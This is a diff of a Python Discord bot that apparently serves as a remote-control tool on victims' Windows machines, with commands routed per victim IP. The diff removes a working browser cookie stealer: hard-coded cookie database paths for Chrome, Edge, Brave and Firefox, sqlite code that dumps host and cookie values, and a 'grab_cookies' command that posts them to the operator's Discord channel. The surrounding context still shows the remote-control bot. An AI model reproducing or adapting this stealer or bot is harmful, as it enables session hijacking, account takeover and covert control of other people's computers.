@@ -29,7 +29,6 @@ import sys
 import win32gui, win32con
 from PIL import Image
 from typing import Optional
-import sqlite3
 
 def get_open_windows():
     windows = {}
@@ -81,60 +80,6 @@ def get_device_ip4():
 def get_device_ip():
     mac = hex(uuid.getnode()).replace('0x', '').upper()
     return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
-
-OS_WINDOWS = os.name == "nt"
-
-# Define browser cookie storage locations
-BROWSER_PATHS = {
-    "Chrome": os.path.expanduser("~") + (r"\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" if OS_WINDOWS else "/Library/Application Support/Google/Chrome/Default/Network/Cookies"),
-    "Edge": os.path.expanduser("~") + (r"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" if OS_WINDOWS else "/Library/Application Support/Microsoft Edge/Default/Cookies"),
-    "Brave": os.path.expanduser("~") + (r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies" if OS_WINDOWS else "/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies"),
-    "Firefox": os.path.expanduser("~") + (r"\AppData\Roaming\Mozilla\Firefox\Profiles" if OS_WINDOWS else "/Library/Application Support/Firefox/Profiles"),
-}
-
-def extract_cookies(browser_name):
-    """Extract cookies from Chrome-based browsers and return formatted string."""
-    cookie_db_path = BROWSER_PATHS.get(browser_name)
-    if not os.path.exists(cookie_db_path):
-        return f"{browser_name} cookies not found."
-
-    temp_cookie_db = cookie_db_path + "_temp"
-    shutil.copyfile(cookie_db_path, temp_cookie_db)  # Make a copy (avoid lock issues)
-
-    conn = sqlite3.connect(temp_cookie_db)
-    cursor = conn.cursor()
-    cursor.execute("SELECT host_key, value FROM cookies")
-
-    cookies = "\n".join(f"{host} | {value}" for host, value in cursor.fetchall())
-    conn.close()
-    os.remove(temp_cookie_db)  # Cleanup temp file
-
-    return cookies
-
-def extract_firefox_cookies():
-    """Extract cookies from Firefox and return formatted string."""
-    profile_path = None
-    if os.path.exists(BROWSER_PATHS["Firefox"]):
-        for folder in os.listdir(BROWSER_PATHS["Firefox"]):
-            if folder.endswith(".default-release"):
-                profile_path = os.path.join(BROWSER_PATHS["Firefox"], folder, "cookies.sqlite")
-                break
-
-    if not profile_path or not os.path.exists(profile_path):
-        return "Firefox cookies not found."
-
-    temp_cookie_db = profile_path + "_temp"
-    shutil.copyfile(profile_path, temp_cookie_db)  # Make a copy
-
-    conn = sqlite3.connect(temp_cookie_db)
-    cursor = conn.cursor()
-    cursor.execute("SELECT host, value FROM moz_cookies")
-
-    cookies = "\n".join(f"{host} | {value}" for host, value in cursor.fetchall())
-    conn.close()
-    os.remove(temp_cookie_db)  # Cleanup temp file
-
-    return cookies
 
 user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
@@ -510,20 +455,6 @@ async def popup(interaction : Interaction, message: str, window_title: Optional[
         
         await interaction.response.send_message(f"Popup window succesfully opened with message: {message}")
 
-@client.slash_command(guild_ids=testServerId, description="Shuts down the client's computer.")
-async def grab_cookies(interaction : Interaction):
-    category = interaction.channel.category
-    if str(category) == str(ip):
-        user_id = interaction.user.id
-        await interaction.response.send_message("Grabbing cookies...")
-        all_cookies = []
-        for browser in ["Chrome", "Edge", "Brave"]:
-            all_cookies.append(extract_cookies(browser))
-        all_cookies.append(extract_firefox_cookies())
-
-        # Combine all cookies into a single string
-        cookies_string = "\n".join(all_cookies)
-        await interaction.edit_original_message(content=f"```{cookies_string}```")
 
 
 
